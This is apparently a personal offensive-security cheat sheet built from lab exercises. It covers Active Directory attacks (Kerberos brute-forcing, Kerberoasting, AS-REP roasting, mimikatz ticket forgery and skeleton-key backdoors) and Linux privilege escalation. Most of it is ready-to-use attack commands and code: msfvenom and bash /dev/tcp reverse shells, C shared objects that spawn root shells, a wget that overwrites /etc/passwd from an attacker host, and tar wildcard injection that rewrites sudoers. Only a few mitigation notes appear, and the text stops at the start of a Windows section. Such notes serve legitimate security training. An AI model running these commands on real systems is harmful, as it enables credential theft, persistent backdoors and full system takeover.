By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
1. kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

-=-=-=-=
Harvesting & Brute-Forcing tickets w/Rubeus

Rubeus.exe harvest /interval:30 This command tells Rubeus to harvest for TGTs every 30 seconds

Brute-Forcing / Password-Spraying w/ Rubeus -

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

echo 10.10.55.165 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

-=-=-=-=
Kerberoasting w/Rubeus & Impacket
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain

Method 1 - Rubeus
Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Method 2 - Impacket
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.55.165 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Kerberoasting Mitigation
Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

-=-=-=-==
AS-REP Roasting w/Rubeus 
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.


AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Dumping KRBASREP5 Hashes w/ Rubeus -
  Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
Crack those Hashes w/ hashcat - 
  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

AS-REP Roasting Mitigations - 

    Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective

    Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
-=-=-=-=-=
Pass the ticket w/ mimikatz 
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

Pass the Ticket Overview - 
Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

First, we utilize UACME to bypass UAC protection and get “Debug Privileges” and “High Integrity”. We can use “whoami /all” to check current privileges and the integrity level

mimikatz.exe
privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.


Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

    Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
-=-=-=-=-=-=
Golden/Silver Ticket Attacks w/ mimikatz 

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

Dump the krbtgt hash -
  privilege::debug - ensure this outputs [privilege '20' ok]
  lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.


Create a Golden/Silver Ticket - 

Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
  Ex: kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 

Use the Golden/Silver Ticket to access other machines -

misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

 -=-=-=-=-=-=
 Kerberos Backdoors w/ mimikatz 

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

privilege::debug
misc::skeleton 

Accessing the forest - 

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques

-=-=-=-=-=-=-=
post-exploitation 

Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

1.)Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts
2.) Start PowerView - . .\Downloads\PowerView.ps1
3.) Enumerate the domain users - Get-NetUser | select cn
4.) Enumerate the domain groups - Get-NetGroup -GroupName *admin*    
get-smbshare -name [share] | fl *
get-smbshareaccess -name "share"
get-netcomputer -fulldata | select operatingsystem

-=-=-=-
Enumeration w/ Bloodhound
Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.

Well be focusing on how to collect the .json files and how to import them into Bloodhound

BloodHound Installation -

1.) apt-get install bloodhound    

2.) neo4j console - default credentials -> neo4j:neo4j

Getting loot w/ SharpHound -

get-executionpolicy
1.) powershell -ep bypass same as with PowerView

2.) . .\Downloads\SharpHound.ps1    

3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
-=-=-=-==
Dumping hashes w/ mimikatz 

privilege::debug 
lsadump::lsa /patch 

-=-=-=-=-=
Enumeration w/Server Manager


Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.

The only way to access the server manager is to rdp into the server and access the server over an rdp connection

We'll only be going over the basics such as looking at users, groups, and trusts however there are a lot of other mischief that you can get your hands on in terms of enumerating with the server manager

This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.

-=-=-=-=-=-=-==============================
Intro to shells

One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.

Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener.

-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=
msfvenom
  
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.98 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe


Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

#Payload Naming Conventions

  When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
  <OS>/<arch>/<payload>

  For example:
  linux/x86/shell_reverse_tcp
  This would generate a stageless reverse shell for an x86 Linux target.

  The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
  windows/shell_reverse_tcp

  For a 64bit Windows target, the arch would be specified as normal (x64).

  Let's break the payload section down a little further.
  In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). 

  The staged equivalent to this payload would be:
    shell/reverse_tcp
  As staged payloads are denoted with another forward slash (/).

  This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
  windows/x64/meterpreter/reverse_tcp

  A Linux 32bit stageless Meterpreter payload would look like this:

  linux/x86/meterpreter_reverse_tcp

  Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

  msfvenom --list payloads

  This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads.
-=-=-=-=-
Once we gain access to a shell

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
 or C:\xampp\FileZilla Server\FileZilla Server.xml
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.


The syntax for this is as follows:

net user <username> <password> /add

net localgroup administrators <username> /add

-=-=-=-=
RDP 
  xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'

-=-=-=-=-=-=-=-=-=-=-=
Linux privelege escalation

1.enumeration 
2.kernel exploits 
3.sudo 
4.suid 
5.capabilities 
6.cron jobs 
7.PATH 
8.NFS 
9.SS
10.lxd

1.First things to check
 hostname
 uname -a 
 /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
 /etc/issue
 ps Command
  The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
  The output of the ps (Process Status) will show the following;
    PID: The process ID (unique to the process)
    TTY: Terminal type used by the user
    Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    CMD: The command or executable running (will NOT display any command line parameter)

  The “ps” command provides a few useful options.

    ps -A: View all running processes
    ps axjf: View process tree (see the tree formation until ps axjf is run below)
    ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

  env

    The env command will show environmental variables.
    The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
    If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH

  sudo -l
    The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

  Id
    The id command will provide a general overview of the user’s privilege level and group memberships.
    It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

  /etc/passwd
    Reading the /etc/passwd file can be an easy way to discover users on the system.

  history
    Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

  ifconfig
    The target system may be a pivoting point to another network. 

  ip route 
    To see wich network routes exist

  netstat
      netstat -a: shows all listening ports and established connections.
      netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
      netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
      netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol. 
      netstat -tp: list connections with the service name and PID information. This can also be used with the -l option to list listening ports
      netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

  The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

      -a: Display all sockets
      -n: Do not resolve names
      -o: Display timers

  find Command

  Find files:

      find . -name flag1.txt: find the file named “flag1.txt” in the current directory
      find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
      find / -type d -name config: find the directory named config under “/”
      find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
      find / -perm a=x: find executable files
      find /home -user frank: find all files for user “frank” under “/home”
      find / -mtime 10: find files that were modified in the last 10 days
      find / -atime 10: find files that were accessed in the last 10 day
      find / -cmin -60: find files changed within the last hour (60 minutes)
      find / -amin -60: find files accesses within the last hour (60 minutes)
      find / -size 50M: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

  It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output 


  Folders and files that can be written to or executed from:

      find / -writable -type d 2>/dev/null : Find world-writeable folders
      find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
      find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

  The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.


      find / -perm -o x -type d 2>/dev/null : Find world-executable folders

  Find development tools and supported languages:

      find / -name perl*
      find / -name python*
      find / -name gcc*

  Find specific file permissions:

  Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

      find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 


  cat /etc/shells #Check available shells

  1 –> Sticky Bit

  2 –> SGID

  4 –> SUID

  7 –> Todos los anteriores

  find / -perm -u=s -type f 2>/dev/null
  find / -perm /4000 -type f 2>/dev/null
  find / -user root -perm -4000 -exec ls -ldb {} \;
  find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
##Automated enumaration tools 
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker

Readable /etc/shadow
Writable /etc/shadow
  mkpasswd -m sha-512 newpasswordhere
Writable /etc/passwd
  openssl passwd newpasswordhere
sudo -l 
nano
  sudo nano
  ctrl+r 
  ctrl+x 
  reset; sh 1>&0 2>&0 

#another way
  openssl passwd -1 -salt loquesea pass
  We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
  We will then add this password with a username to the /etc/passwd file.



vim
  sudo vim -c ':!/bin/bash'
  or 
  sudo vim 
  :set shell=/bin/bash 
  :shell
apache2
  sudo apache2 -f /etc/shadow
wget 
  On Attaker Side.

  First Copy Target’s /etc/passwd file to attacker machine.
  modify file and add a user in passwd file which is saved in the previous step to the attacker machine.
  append this line only =>  touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
  host that passwd file to using any web server.

  On Victim Side.
  sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd

  now switch user
awk
  sudo awk 'BEGIN {system("/bin/bash")}'
less
  sudo less /etc/profile #For example
ftp
  sudo ftp
  !/bin/bash
nmap 
  TF=$(mktemp)
  echo 'os.execute("/bin/sh")' > $TF
  sudo nmap --script=$TF

  sudo nmap --interactive 
  !/bin/bash
more
  sudo TERM= more /etc/profile 
  !/bin/sh
systemctl
  TF=$(mktemp).service
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/sh -c "whoami"
  [Install]
  WantedBy=multi-user.target' > $TF
  /bin/systemctl link $TF
  /bin/systemctl enable --now $TF
  /bin/bash -p

-=-=-=-=-=-=-=-=-=-=-=-=-=
#Environment variables
gcc -fPIC -shared -nostartfiles -o /tmp/exploiting.so /home/user/tools/sudo/preload.c
  
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
  usetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

sudo LD_PRELOAD=/tmp/exploiting.so program-name-here
-=-=-=
Another example with LD_PRELOAD 

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

The function is named _init and that's important, otherwise your exploit code won't work. The reason is that the  _init function runs before any other user-defined code runs, to perform all the necessary initializations. So the name has to be the same, or else it won't work*

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

gcc -fPIC -shared -o shell.so shell.c -nostartfiles


We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

This will result in a shell spawn with root privileges.

-=-
#Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile). Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file. 


ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c 

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack(){
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

sudo LD_LIBRARY_PATH=/tmp apache2

-=-=-=
SUID/SGID Executables 

SUID Bit - Files: User executes the file with permissions of the file owner // Directories: -
SGID Bit - Files: User executes the file with the permission of the group owner. // Directories: File created in directory gets the same group owner.
Sticky Bit - Files: No meaning	//Directories: Users are prevented from deleting files from other users.

#One way is doing a strings in a file and checking if is not full path. In that case, using curl as an example
  echo /bin/sh > curl
  chmod 777 curl
  [change PATH]
  [run binary]

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

#Shared object Injection
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkidr /home/user/.config
gcc -share -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}

-=-=-=-=
Privilege escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled Capabilities. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

getcap -r / 2>/dev/null

=-=-=-=
PATH  

We could use this script:
#include <unistd.h>
void main()
{
    setuid(0);
    setgid(0);
    system("thm");
}

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit
  gcc path_exp.c -o path -w
  chmod u+s path

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “find / -writable 2>/dev/null” command
find / -writable 2>/dev/null | cut -d"/" -f 2,3 | sort -u

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it.
  export PATH=/tmp:$PATH

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

-=-=-=-=
Network File Sharing

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.
  showmount -e 10.10.45.161

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
#In our machine 
  mkdir /tmp/loquesea 
  mount -o rw 10.10.45.161:/<el share> /tmp/loquesea

#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

-=-=-=-=
9.SSH
SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

    ssh -L 80:intra.example.com:80 gw.example.com 
    ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com

The same as listening but with socat 
./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &

-=-=-=-=
lxd
Able to deploy docker
 - searchsploit lxd 
 - check linux version. If 32 bits: ./build-alpine -a i686
 - transfer files to victim machine 
 - lxd_privesc.sh -f *.tar.gz 
 - If "This mus be run as root"
 - lxc image list # Imagen ya creada

#Troubleshooting
1.) Run this command in your home directory - git clone https://github.com/saghul/lxd-alpine-builder.git
2.) Then this - sudo ./build-alpine
3.) If above command run properly without errors then congrats!
4.) If not maybe the error is due to mirror sites but it will create a rootfs directory in same folder i.e "lxd-alpine-builder" .
5.) Goto - cd/rootfs/usr/share/alpine-mirrors/Mirrors.txt
6.) Open that .txt file with any editor and remove all the mirror sites except first one, then save it there only.
7.) Again run - sudo ./build-alpine


-=-=-=-=
Passwords & keys 
cat ~/.*history | less
ls -la /

-=-=-=-=-=-=-=
/etc/passwd
    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    Group ID (GID): The primary group ID (stored in /etc/group file)
    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

If we can write on it:
  Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]

/usr/bin/vi with sudo -l ==> sudo vi ==> :!sh

-=-=-=-=-
Crontabs
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.



cat /etc/crontab

bash -i >& /dev/tcp/<IP>/4126 0>&1

other file to create

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p

#another example
The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job

#other example with this backup.sh
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1

#With wildcards
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf #In our host. SCP to the other machine 
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
-=-=-=-=-

Windows privilege escalation
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1.Harvesting passwords from usual spots

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem
	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service
